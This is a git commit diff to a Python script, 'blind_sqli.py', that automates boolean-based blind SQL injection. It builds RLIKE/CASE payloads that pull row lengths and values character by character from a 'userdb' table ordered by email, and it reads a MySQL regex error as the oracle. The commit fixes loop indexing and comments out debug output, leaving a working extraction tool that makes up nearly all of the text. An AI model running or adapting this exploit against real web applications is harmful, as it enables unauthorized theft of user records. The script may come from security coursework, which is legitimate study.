12d6404b4b7794e17cab9aec9db10099f1ef9409
baharna <travis.s.whitney@gmail.com>
2019-04-18 10:23:45 -0400

    Update blind_sqli.py

--- python_errata/blind_sqli.py
+++ python_errata/blind_sqli.py
@@ -2,7 +2,7 @@
 
 import requests
 import argparse
-
+import time
 
 def makeRequest(url, params, payload):
     params = dict(i.split('=') for i in params.split('&'))
@@ -44,58 +44,86 @@ def getRows(url, params):
     return numRows
 
 def getLength(i, item, url, params):
-    countLength = 0
+    countLength = 1
     while True:
         payload = "test' RLIKE (SELECT (CASE WHEN ((SELECT"
         payload += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + item + ") AS"
         payload += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT "
         payload += str(i) + ",1)=" + str(countLength) + ") THEN 0x28 ELSE 0x41 END))"
         payload += " AND 'LeSo'='LeSo"
-
+        #print(payload)
         response = makeRequest(url, params, payload)
         if "parentheses not balanced" in response:
+            #print("broke from length index identification")
+            #print("Row " + str(i) + " in " + item + " is 
             break
         countLength += 1
+    #print(countLength)
     itemLen = []
-    j = 0
-    c = 48
+    j = 1
+    #c = 48
+    #for j in range(1, countLength):
     while j <= countLength:
-        while c<= 58:
-            payload = "test' RLIKE (SELECT(CASE WHEN (ORD(MID((SELECT"
+        c = 48
+        while c <= 58:
+            #payload = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT"
+            #payload += " IFNULL(CAST(CHAR_LENGTH(" + item + ") AS CHAR),0x20) FROM"
+            #payload += " userdb ORDER BY email LIMIT " + str(i) + ",1)," + str(j)
+            #payload += ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND 'LeSo'='LeSo"
+            #print(payload)
+            #payload = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT"
+            #payload += " IFNULL(CAST(CHAR_LENGTH(" + item + ") AS CHAR),0x20) FROM"
+            #payload += " userdb ORDER BY email LIMIT " + str(i) + ",1)," + str(j)
+            #payload += ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye"
+            payload = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT"
             payload += " IFNULL(CAST(CHAR_LENGTH(" + item + ") AS CHAR),0x20) FROM"
-            payload += " userdb ORDER BY email LIMIT " + str(i) + ",1)," + str(j)
-            payload += ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND 'LeSo'='LeSo"
-
-            response = makeRequest(url, params, payload)
-            if "parentheses not balanced" in response:
+            payload += " userdb ORDER BY email LIMIT " + str(i) +",1)," + str(j) 
+            payload += ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye"
+            #print(payload)
+            response2 = makeRequest(url, params, payload)
+            if "parentheses not balanced" in response2:
+                #print("broke from length cahr identification")
+                #print(c)
                 itemLen.append(chr(c))
                 break
             c += 1
         j += 1
+    #print(itemLen)
     itemLen = "".join(str(k) for k in itemLen)
-    print(itemLen)
+    #print(itemLen)
     return itemLen
 
 def getValue(i, item, length, url, params):
     value = []
-    j = 0
-    c = 32
+    j = 1
+    #c = 32
+    #print("We're in values now")
+    #print(" Lentgth is : " + length)
+    #print(int(length))
     if length:
-        while j <= length:
+        while j <= int(length):
+        #for j in range(1, int(length)):
+            #print("Testing character: " + str(j))
+            #print(value)
+            #print("sleeping")
+            #time.sleep(1)
+            c = 32
             while c<= 126:
                 payload = "test' RLIKE(SELECT (CASE WHEN (ORD(MID((SELECT"
                 payload += " IFNULL(CAST(" + item+ " AS CHAR),0x20) FROM userdb ORDER BY"
-                payload += " email LIMIT " + row + ",1)," + str(j) + ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41"
+                payload += " email LIMIT " + str(i) + ",1)," + str(j) + ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41"
                 payload += " END)) and 'LeSo'='LeSo"
-
+                
                 response = makeRequest(url, params, payload)
+                #print(c)
                 if "parentheses not balanced" in response:
+                    #print(chr(c))
                     value.append(chr(c))
                     break
                 c += 1
             j += 1
-    value = "".join(chr(k) for k in value)
-    print(value)
+    #print(value)
+    value = "".join(str(k) for k in value)
     return value
 
 def printValues(i, item, length, value):
